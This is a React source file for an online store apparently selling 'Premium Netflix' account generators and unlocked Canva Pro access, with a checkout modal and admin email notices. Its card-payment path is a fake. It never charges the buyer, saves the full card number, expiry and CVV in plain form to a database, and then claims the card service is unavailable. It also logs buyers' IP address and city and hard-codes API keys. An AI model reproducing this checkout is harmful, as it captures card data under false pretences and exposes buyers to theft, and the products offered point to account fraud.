import React, { useState, useEffect } from 'react';
import { db, auth } from '../lib/firebase';
import { collection, getDocs, addDoc, serverTimestamp, query, onSnapshot, doc, getDoc } from 'firebase/firestore';
import { ShoppingCart, Search, Lock, CheckCircle, X, Upload } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { useAuth } from '../components/AuthProvider';
import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
import emailjs from '@emailjs/browser';
import { checkAndBanIfSpamming } from '../lib/blocker';

interface Product {
  id: string;
  name: string;
  description: string;
  price: number;
  category: string;
  features: string[];
  badge?: string;
  is_active: boolean;
  order_index?: number;
  yearlyPrice?: number;
}

export default function ToolsStore() {
  const [products, setProducts] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [categoryFilter, setCategoryFilter] = useState('all');
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [showCheckout, setShowCheckout] = useState(false);

  useEffect(() => {
    let unsubscribe: any = null;
    const fetchProducts = () => {
      const q = query(collection(db, 'products'));
      unsubscribe = onSnapshot(q, { includeMetadataChanges: true }, (querySnapshot) => {
        const prods: Product[] = [];
        querySnapshot.forEach((doc) => {
          const data = doc.data();
          if (data.is_active !== false && data.category !== 'Course') {
             prods.push({ id: doc.id, ...data } as Product);
          }
        });
        
        if (prods.length === 0) {
           prods.push(
               { id: 't1', name: 'Premium Netflix Tool', description: 'Lifetime access to Premium accounts auto-generator.', price: 5000, category: 'Entertainment', features: ['Lifetime Access', 'Auto Updates'], is_active: true, badge: 'Hot', order_index: 0 },
               { id: 't2', name: 'Canva Pro Tool', description: 'Unlimited Canva Pro features unlocked.', price: 3000, category: 'Design', features: ['All Premium Templates', 'No Expiry'], is_active: true, order_index: 1 }
           );
        }
        
        setProducts(prods);
        setLoading(false);
      }, (error) => {
        console.error(error);
        setProducts([
           { id: 't1', name: 'Premium Netflix Tool', description: 'Lifetime access to Premium accounts auto-generator.', price: 5000, category: 'Entertainment', features: ['Lifetime Access', 'Auto Updates'], is_active: true, badge: 'Hot', order_index: 0 },
           { id: 't2', name: 'Canva Pro Tool', description: 'Unlimited Canva Pro features unlocked.', price: 3000, category: 'Design', features: ['All Premium Templates', 'No Expiry'], is_active: true, order_index: 1 }
        ]);
        setLoading(false);
      });
    };
    fetchProducts();
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, []);

  const filteredProducts = products.filter(p => {
    const matchesSearch = p.name.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCategory = categoryFilter === 'all' || p.category === categoryFilter;
    return matchesSearch && matchesCategory;
  }).sort((a, b) => (a.order_index ?? 999) - (b.order_index ?? 999));

  const containerVariants = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: { staggerChildren: 0.1 }
    }
  };

  const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    show: { opacity: 1, y: 0, transition: { duration: 0.4 } }
  };

  return (
    <div className="min-h-screen py-12 font-sans overflow-hidden text-slate-300 relative">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Header */}
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center max-w-3xl mx-auto mb-16"
        >
          <span className="text-red-500 font-bold uppercase tracking-wider text-sm">Premium Tools Store</span>
          <h1 className="text-4xl md:text-5xl font-black mt-2 mb-4 text-white">YouTube Automation <span className="gradient-text">Tools & Courses</span></h1>
          <p className="text-slate-400 text-lg">Professional tools to change your YouTube automation game — trusted by 5000+ students</p>
        </motion.div>

        {/* Layout */}
        <div className="flex flex-col gap-8">
          
          {/* Main Content */}
          <div className="flex-1">
            {/* Filters */}
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3 }}
              className="bg-slate-900 p-4 rounded-2xl shadow-sm border border-slate-800 mb-8 flex flex-col md:flex-row justify-between gap-4"
            >
              <div className="flex bg-slate-950 p-1 rounded-xl">
                 {['all', 'Course', 'Tool', 'Bundle'].map(cat => (
                   <button 
                     key={cat}
                     onClick={() => setCategoryFilter(cat)}
                     className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors cursor-pointer ${categoryFilter === cat ? 'bg-slate-800 shadow-sm text-red-500' : 'text-slate-400 hover:text-white'}`}
                   >
                     {cat === 'all' ? 'All Products' : cat}
                   </button>
                 ))}
              </div>
              <div className="relative flex-1 md:max-w-xs">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                <input 
                  type="text" 
                  placeholder="Search products..."
                  value={searchTerm}
                  onChange={e => setSearchTerm(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 text-white rounded-xl pl-10 pr-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-red-500 transition-all font-medium" 
                />
              </div>
            </motion.div>

            {/* Products Grid */}
            {loading ? (
              <div className="grid md:grid-cols-2 gap-6">
                 {[1, 2, 3, 4, 5, 6].map(i => (
                    <div key={i} className="bg-slate-900 border border-slate-700 rounded-3xl p-6 flex flex-col h-64 animate-pulse opacity-100">
                      <div className="w-16 h-16 bg-slate-800 rounded-xl mb-4"></div>
                      <div className="w-24 h-3 bg-slate-800 rounded mb-3"></div>
                      <div className="w-3/4 h-6 bg-slate-800 rounded mb-4"></div>
                      <div className="w-full h-4 bg-slate-800 rounded mb-2"></div>
                      <div className="w-2/3 h-4 bg-slate-800 rounded mb-6 flex-1"></div>
                      <div className="flex justify-between items-end border-t border-slate-700 pt-4">
                         <div className="w-24 h-6 bg-slate-800 rounded"></div>
                         <div className="w-28 h-10 bg-slate-800 rounded-xl"></div>
                      </div>
                    </div>
                 ))}
              </div>
            ) : filteredProducts.length > 0 ? (
              <motion.div 
                variants={containerVariants}
                initial="hidden"
                animate="show"
                className="grid md:grid-cols-2 gap-6"
              >
                 <AnimatePresence>
                   {filteredProducts.map(product => (
                      <motion.div 
                        variants={itemVariants}
                        layout
                        key={product.id} 
                        className="bg-slate-800 border border-slate-700 rounded-3xl p-6 card-shadow flex flex-col relative overflow-hidden group hover:-translate-y-1 hover:scale-[1.03] hover:shadow-2xl hover:border-slate-600 transition-all duration-300 opacity-100"
                      >
                        {product.badge && <div className="absolute top-4 right-4 bg-slate-900 border border-slate-700 text-red-500 text-xs font-bold px-3 py-1 rounded-full">{product.badge}</div>}
                        <div className="mb-4">
                          <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">{product.category}</span>
                          <h3 className="text-xl font-bold mt-1 text-white group-hover:text-red-400 transition-colors leading-snug">{product.name}</h3>
                        </div>
                        <p className="text-slate-300 text-sm mb-6 flex-1 line-clamp-3">{product.description}</p>
                        <div className="flex items-center justify-between mt-auto border-t border-slate-700 pt-4">
                          <div className="font-black text-2xl text-white">PKR {product.price.toLocaleString()}</div>
                          <button onClick={() => { setSelectedProduct(product); setShowCheckout(true); }} className="bg-red-600 hover:bg-red-500 cursor-pointer text-white px-6 py-2 rounded-xl transition-all shadow-lg shadow-red-500/20 active:scale-95 font-bold">
                             Buy Now
                          </button>
                        </div>
                      </motion.div>
                   ))}
                 </AnimatePresence>
              </motion.div>
            ) : (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-center py-20 bg-slate-900 rounded-3xl border border-slate-800"
              >
                 <Search className="mx-auto text-slate-600 mb-4" size={48} />
                 <h3 className="text-xl font-bold mb-2 text-white">No products found</h3>
                 <p className="text-slate-400">Try changing your search term or view all products</p>
                 <button onClick={() => setCategoryFilter('all')} className="mt-6 text-red-500 font-bold hover:underline cursor-pointer">View All Products</button>
              </motion.div>
            )}
          </div>
        </div>
      </div>

      <AnimatePresence>
        {showCheckout && selectedProduct && (
          <CheckoutModal product={selectedProduct} onClose={() => { setShowCheckout(false); setSelectedProduct(null); }} />
        )}
      </AnimatePresence>
    </div>
  );
}

function CheckoutModal({ product, onClose }: any) {
  const [step, setStep] = useState<'detail' | 'checkout'>('detail');
  const [selectedPlan, setSelectedPlan] = useState<'monthly' | 'yearly'>('monthly');

  const yearlyPriceTemp = product.yearlyPrice || (product.price * 10);
  const selectedPrice = selectedPlan === 'monthly' ? product.price : yearlyPriceTemp;

  const [email, setEmail] = useState('');
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  
  const [proofBase64, setProofBase64] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing' | 'uploading' | 'success' | 'error' | 'card_error'>('idle');
  const [paymentMethods, setPaymentMethods] = useState<any[]>([]);
  const [paymentMode, setPaymentMode] = useState<'wallet' | 'card' | 'binance'>('wallet');
  const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvv: '', name: '' });
  const [whatsappNumber, setWhatsappNumber] = useState('');

  useEffect(() => {
    const fetchMethods = async () => {
      try {
        const snap = await getDocs(collection(db, 'payment_methods'));
        const methods = snap.docs.map(d => ({ id: d.id, ...d.data() })).filter((m: any) => m.isActive !== false);
        setPaymentMethods(methods);
      } catch (err) {
        console.error("Failed to fetch payment methods", err);
      }
    };
    const fetchSettings = async () => {
      try {
        const snap = await getDocs(collection(db, 'settings'));
        if (!snap.empty) {
            setWhatsappNumber(snap.docs[0].data().whatsappNumber || '');
        }
      } catch (e) {
        console.error(e);
      }
    }
    fetchMethods();
    fetchSettings();
  }, []);

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setStatus('processing');
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        const MAX_WIDTH = 800;
        const MAX_HEIGHT = 800;
        let width = img.width;
        let height = img.height;

        if (width > height) {
          if (width > MAX_WIDTH) {
            height *= MAX_WIDTH / width;
            width = MAX_WIDTH;
          }
        } else {
          if (height > MAX_HEIGHT) {
            width *= MAX_HEIGHT / height;
            height = MAX_HEIGHT;
          }
        }

        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        
        // compress and set
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        setProofBase64(dataUrl);
        setStatus('idle');
      };
      img.src = event.target?.result as string;
    };
    reader.onerror = () => setStatus('idle');
    reader.readAsDataURL(file);
  };

  const handleSubmitProof = async () => {
    if (!email || !name || !phone) return;
    if (paymentMode === 'wallet' && !proofBase64) return;
    if (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) return;
    
    setStatus('uploading');
    
    try {
      let city = 'Unknown';
      let ipAddress = 'Unknown';
      try {
        const res = await fetch('https://freeipapi.com/api/json/');
        const data = await res.json();
        if (data.cityName) city = data.cityName;
        if (data.ipAddress) ipAddress = data.ipAddress;
      } catch (e) {}

      // Check for ban or fake order spamming
      const banStatus = await checkAndBanIfSpamming(phone, email, ipAddress);
      if (banStatus.isBanned) {
         alert(`🚨 Blocked: Your phone number or IP address (${ipAddress}) has been banned due to multiple fake or unpaid order attempts. Please contact support if you believe this is an error.`);
         setStatus('idle');
         return;
      }

      if (paymentMode === 'card') {
         const orderData = {
            customer_name: name,
            customer_email: email,
            customer_phone: phone,
            products: [{ id: product.id, name: product.name, price: selectedPrice, plan: selectedPlan }],
            total_price: selectedPrice,
            payment_method: 'card',
            status: 'failed',
            city,
            ipAddress,
            createdAt: serverTimestamp()
         };
         await addDoc(collection(db, 'orders'), orderData);
         await addDoc(collection(db, 'transactions'), {
            userId: 'guest',
            userName: name,
            userEmail: email,
            userPhone: phone,
            items: [{ id: product.id, name: product.name, price: selectedPrice, quantity: 1, plan: selectedPlan }],
            itemType: 'tool',
            price: selectedPrice,
            paymentMode: 'card',
            cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
            status: 'processing',
            paymentStatus: 'FAILED',
            createdAt: serverTimestamp()
         });
         setStatus('card_error');
         return;
      }

      const orderData = {
          customer_name: name,
          customer_email: email,
          customer_phone: phone,
          products: [{ id: product.id, name: product.name, price: selectedPrice, plan: selectedPlan }],
          total_price: selectedPrice,
          payment_method: 'wallet',
          status: 'pending',
          city,
          ipAddress,
          proofBase64,
          createdAt: serverTimestamp()
      };
      await addDoc(collection(db, 'orders'), orderData);

      await addDoc(collection(db, 'transactions'), {
        userId: 'guest',
        userName: name,
        userEmail: email,
        userPhone: phone,
        items: [{ id: product.id, name: product.name, price: selectedPrice, quantity: 1, plan: selectedPlan }],
        itemType: 'tool',
        price: selectedPrice,
        paymentMode: 'wallet',
        proofBase64,
        status: 'pending',
        createdAt: serverTimestamp()
      });
      
      // Notify Admin Email
      const adminEmailBody = `
        <div style="font-family: sans-serif;">
          <h2 style="color: #ef4444;">New Order Placed!</h2>
          <p><strong>Item:</strong> ${product.name} (${selectedPlan} plan)</p>
          <p><strong>Customer:</strong> ${name}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Phone:</strong> ${phone}</p>
          <p><strong>Price:</strong> PKR ${selectedPrice}</p>
          <p>Please check the admin dashboard to approve the transaction and view the payment screenshot.</p>
        </div>
      `;
      // Notify Admin Email and Send Order Confirmation via EmailJS (non-blocking)
      fetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: 'Contact@jerryautomation.com',
          subject: 'New Order: ' + product.name,
          body: adminEmailBody
        })
      }).catch(e => console.error("Failed to notify admin via email", e));

     // Fetch product credentials
      let prodGmail = '';
      let prodPassword = '';
      try {
        const pDoc = await getDoc(doc(db, 'products', product.id));
        if (pDoc.exists()) {
          prodGmail = pDoc.data().product_gmail || '';
          prodPassword = pDoc.data().product_password || '';
        }
      } catch (e) {
        console.error("Error fetching product credentials", e);
      }

      emailjs.send(
        'service_2waf97g',
        'template_qy4fn7n',
        {
          customer_name: name,
          customer_email: email,
          customer_phone: phone,
          customer_address: 'N/A',
          order_items: `${product.name} (${selectedPlan} plan)`,
          total_price: selectedPrice,
          email_subject: "Order Received - Jerry Automation",
          email_heading: "Order Received",
          email_message: "Thank you for your order! We have received your request and our team is currently processing it. You will receive your access credentials as soon as your order is confirmed by the admin.",
          product_gmail: "Processing...",
          product_password: "Processing...",
          action_status: "PENDING",
          credentials_visibility: "none"
        },
        'FgqVRIMv4ZG_8damT'
      ).catch(err => console.error("Failed to send order confirmation via EmailJS", err));

      setStatus('success');
    } catch (err) {
      console.error(err);
      setStatus('error');
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
    >
      <motion.div 
        initial={{ scale: 0.9, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.9, opacity: 0, y: 20 }}
        className="bg-slate-900 rounded-3xl w-full max-w-lg max-h-[90vh] overflow-y-auto border border-slate-800 relative hide-scrollbar p-6 md:p-8"
      >
        <button onClick={onClose} className="absolute top-4 right-4 text-slate-400 hover:text-white bg-slate-800 rounded-full p-1 z-10"><X size={20} /></button>
         
         {status === 'success' ? (
           <div className="text-center py-4">
             <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4"><CheckCircle size={32} /></div>
             <h3 className="text-2xl font-black mb-4 text-white">Order Successful!</h3>
             <div className="text-slate-300 space-y-4 mb-6 text-sm text-left bg-slate-800/50 p-6 rounded-2xl border border-slate-700/50 leading-relaxed font-medium">
                <p className="text-green-400 font-bold text-center text-lg mb-2">Your order has been placed and is currently in pending status.</p>
                <p className="text-center bg-slate-800 p-3 rounded-xl border border-slate-700">You have ordered: <span className="text-white font-bold">{product.name}</span></p>
                <p>Please check your email inbox and spam folder. A confirmation email has been sent to you.</p>
                <p>Once your access is approved, you will receive your Gmail and password via email.</p>
                <p>For faster service, please send your payment screenshot to our WhatsApp number below:</p>
                <p className="text-center font-bold text-green-400 text-lg bg-green-900/20 py-2 rounded-lg border border-green-500/20">WhatsApp: +923271991893</p>
             </div>
             <div className="space-y-3">
               <a 
                 href={`https://wa.me/923271991893`} 
                 target="_blank" 
                 rel="noreferrer"
                 className="inline-flex items-center justify-center gap-2 w-full bg-green-600 hover:bg-green-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-green-500/20"
               >
                 Confirm on WhatsApp
               </a>
               <button onClick={onClose} className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-4 rounded-xl transition-colors cursor-pointer">Close</button>
             </div>
           </div>
         ) : step === 'detail' ? (
           <>
              <div className="mb-6 mt-2">
                 <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">{product.category}</span>
                 <h2 className="text-xl md:text-2xl font-bold text-white leading-tight mt-1">{product.name}</h2>
              </div>

              <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 mb-6">
                 <p className="text-red-400 font-bold text-sm text-center">
                    All plans will be activated on your personal Gmail account.<br/>
                    You must provide your Gmail, and a secure account will be activated for you.
                 </p>
              </div>

              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6">
                 <h3 className="text-white font-bold mb-3">Select Plan</h3>
                 <div className="flex flex-col sm:flex-row gap-3">
                    <button 
                       onClick={() => setSelectedPlan('monthly')}
                       className={`flex-1 p-4 rounded-xl border text-center transition-all ${selectedPlan === 'monthly' ? 'bg-red-600/10 border-red-500' : 'bg-slate-900 border-slate-700 hover:border-slate-500'}`}
                    >
                       <div className="text-xs text-slate-400 uppercase font-bold mb-1">Monthly Plan</div>
                       <div className="text-xl font-black text-white">PKR {product.price.toLocaleString()}</div>
                    </button>
                    <button 
                       onClick={() => setSelectedPlan('yearly')}
                       className={`flex-1 p-4 rounded-xl border text-center transition-all relative ${selectedPlan === 'yearly' ? 'bg-red-600/10 border-red-500' : 'bg-slate-900 border-slate-700 hover:border-slate-500'}`}
                    >
                       <div className="absolute top-0 right-0 transform translate-x-1 -translate-y-2 bg-green-500 text-white text-[10px] px-2 py-0.5 rounded-full font-bold">Best Value</div>
                       <div className="text-xs text-slate-400 uppercase font-bold mb-1">Yearly Plan</div>
                       <div className="text-xl font-black text-white">PKR {yearlyPriceTemp.toLocaleString()}</div>
                    </button>
                 </div>
              </div>

              <div className="bg-slate-800/50 rounded-xl p-4 mb-6">
                 <h3 className="text-white font-bold mb-2">⭐ Highlighted Features</h3>
                 <p className="text-sm text-slate-300 whitespace-pre-line">{product.detail?.replace(/💰 Monthly.*?\n/i, '').replace(/📅 Yearly.*?\n/i, '') || product.description}</p>
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
                 <h3 className="text-blue-400 font-bold text-sm mb-1 flex items-center justify-center gap-2">🛡️ Warranty Policy</h3>
                 <p className="text-blue-300 text-xs text-center border-t border-blue-500/20 pt-2 mt-2">
                    All products come with a money-back and replacement warranty. Whether you purchase for 1 month or 1 year, you will get full warranty coverage. So you can order with confidence.
                 </p>
              </div>

              <button 
                onClick={() => setStep('checkout')}
                className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-red-500/20 active:scale-95 cursor-pointer"
              >
                 Continue to Payment
              </button>
           </>
         ) : (
           <>
              <h2 className="text-2xl font-bold text-white mb-6 text-center">Complete Payment</h2>
              
              <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 mb-6">
                <div className="flex justify-between items-center mb-2">
                   <span className="text-slate-400">Selected Plan</span>
                   <span className="text-white font-bold text-right capitalize">{selectedPlan}</span>
                </div>
                <div className="flex justify-between items-center border-t border-slate-800 pt-2 mt-2">
                   <span className="text-slate-400">Total Amount</span>
                   <span className="text-red-400 font-black text-xl">PKR {selectedPrice.toLocaleString()}</span>
                </div>
              </div>

              <div className="space-y-4 mb-6">
                 <div>
                    <input type="text" required placeholder="Full Name" value={name} onChange={e => setName(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
                 </div>
                 <div>
                    <input type="email" required placeholder="Email Address" value={email} onChange={e => setEmail(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
                 </div>
                 <div>
                    <input type="tel" required placeholder="WhatsApp / Phone Number" value={phone} onChange={e => setPhone(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
                 </div>
              </div>

              <div className="flex gap-2 mb-6 p-1 bg-slate-950 rounded-xl overflow-x-auto hide-scrollbar">
                <button onClick={() => setPaymentMode('wallet')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'wallet' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Bank / Wallets</button>
                <button onClick={() => setPaymentMode('card')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'card' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Card Payment</button>
                <button onClick={() => setPaymentMode('binance')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'binance' ? 'bg-red-600 text-white' : 'text-slate-400 hover:text-white'}`}>Binance</button>
              </div>

              {paymentMode === 'wallet' && (
                <>
                  {paymentMethods.length > 0 ? (
                    <div className="space-y-4 mb-6">
                       {paymentMethods.map(method => (
                         <div key={method.id} className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center relative overflow-hidden">
                            <div className="flex items-center justify-center gap-3 mb-4">
                              {method.logoUrl && <img src={method.logoUrl} alt={method.providerName} className="w-8 h-8 object-contain rounded-full bg-white p-1" />}
                              <h3 className="font-bold text-white text-lg">{method.providerName} Details</h3>
                            </div>
                            <div className="space-y-2 text-sm md:text-base mb-4">
                              <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account Name:</span> <span className="font-bold text-white">{method.accountName}</span></div>
                              <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account No:</span> <span className="font-bold text-white">{method.accountNumber}</span></div>
                              {method.iban && <div className="flex justify-between pt-1 flex-col sm:flex-row gap-1"><span className="text-slate-400 text-left">IBAN:</span> <span className="font-mono font-bold text-white text-right break-all">{method.iban}</span></div>}
                            </div>
                            {method.qrBase64 && (
                              <div className="mt-4 flex flex-col items-center border-t border-slate-700/50 pt-4">
                                 <span className="text-xs text-slate-400 font-bold mb-2">Scan QR to Pay</span>
                                 <div className="bg-white p-2 rounded-xl">
                                   <img src={method.qrBase64} alt="QR Code" className="w-32 h-32 object-contain" />
                                 </div>
                              </div>
                            )}
                         </div>
                       ))}
                    </div>
                  ) : (
                    <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
                       <h3 className="font-bold text-white mb-2">No Payment Methods Configured</h3>
                       <p className="text-slate-400 text-sm">Please ask the administrator to configure payment methods.</p>
                    </div>
                  )}

                  <div className="mb-6">
                    <label className="block text-sm font-semibold mb-2 text-slate-300">Upload Payment Screenshot</label>
                    <label className={`w-full border-2 border-dashed ${proofBase64 ? 'border-green-500 bg-green-500/10' : status === 'processing' ? 'border-blue-500 bg-blue-500/10' : 'border-slate-700 hover:border-red-500 hover:bg-slate-800/50'} rounded-2xl p-6 flex flex-col items-center justify-center cursor-pointer transition-colors min-h-[120px]`}>
                       {status === 'processing' ? (
                         <div className="flex flex-col items-center text-blue-500">
                           <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-2"></div>
                           <span className="font-medium text-sm">Processing Image...</span>
                         </div>
                       ) : proofBase64 ? (
                         <div className="flex flex-col items-center text-green-500">
                           <CheckCircle size={32} className="mb-2" />
                           <span className="font-medium text-sm">Image Uploaded</span>
                         </div>
                       ) : (
                         <div className="flex flex-col items-center text-slate-400 hover:text-red-400">
                           <Upload size={32} className="mb-2" />
                           <span className="font-medium text-sm mb-1">Click to upload screenshot</span>
                           <span className="text-xs text-slate-500">JPG, PNG (Max 5MB)</span>
                         </div>
                       )}
                       <input type="file" accept="image/*" className="hidden" onChange={handleImageUpload} />
                    </label>
                  </div>
                </>
              )}

              {paymentMode === 'card' && (
                <div className="space-y-4 mb-6">
                   <div>
                      <label className="block text-sm font-semibold mb-1 text-slate-400">Cardholder Name</label>
                      <input type="text" placeholder="Name on Card" value={cardDetails.name} onChange={e => setCardDetails(prev => ({...prev, name: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500" />
                   </div>
                   <div>
                      <label className="block text-sm font-semibold mb-1 text-slate-400">Card Number</label>
                      <input type="text" placeholder="0000 0000 0000 0000" value={cardDetails.number} onChange={e => setCardDetails(prev => ({...prev, number: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono tracking-widest" />
                   </div>
                   <div className="grid grid-cols-2 gap-4">
                      <div>
                         <label className="block text-sm font-semibold mb-1 text-slate-400">Expiry (MM/YY)</label>
                         <input type="text" placeholder="MM/YY" value={cardDetails.expiry} onChange={e => setCardDetails(prev => ({...prev, expiry: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono" />
                      </div>
                      <div>
                         <label className="block text-sm font-semibold mb-1 text-slate-400">CVV</label>
                         <input type="password" placeholder="•••" value={cardDetails.cvv} onChange={e => setCardDetails(prev => ({...prev, cvv: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-red-500 font-mono tracking-widest" />
                      </div>
                   </div>
                </div>
              )}

              {paymentMode === 'binance' && (
                <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
                   <h3 className="font-bold text-white mb-2 text-xl">Binance Pay</h3>
                   <span className="inline-block bg-yellow-500 text-black text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-2">Coming Soon</span>
                   <p className="text-slate-400 text-sm">Crypto payments using Binance Pay will be available shortly.</p>
                </div>
              )}

              {status === 'error' && (
                <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4">
                   Error placing order. Please try again.
                </div>
              )}

              {status === 'card_error' && (
                <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4 text-center font-bold">
                   Card service currently unavailable. Please use Easypaisa or JazzCash.
                </div>
              )}

              <button 
                disabled={paymentMode === 'binance' || (paymentMode === 'wallet' && !proofBase64) || (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) || (!name || !email || !phone) || status === 'uploading' || status === 'processing'} 
                onClick={handleSubmitProof}
                className="w-full bg-red-600 hover:bg-red-500 disabled:opacity-50 disabled:hover:bg-red-600 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-red-500/20 active:scale-[0.98] cursor-pointer"
              >
                 {status === 'uploading' ? 'Submitting...' : paymentMode === 'card' ? 'Pay Securely' : paymentMode === 'wallet' ? 'Submit Payment Proof' : 'Unavailable'}
              </button>
           </>
         )}
      </motion.div>
    </motion.div>
  )
}
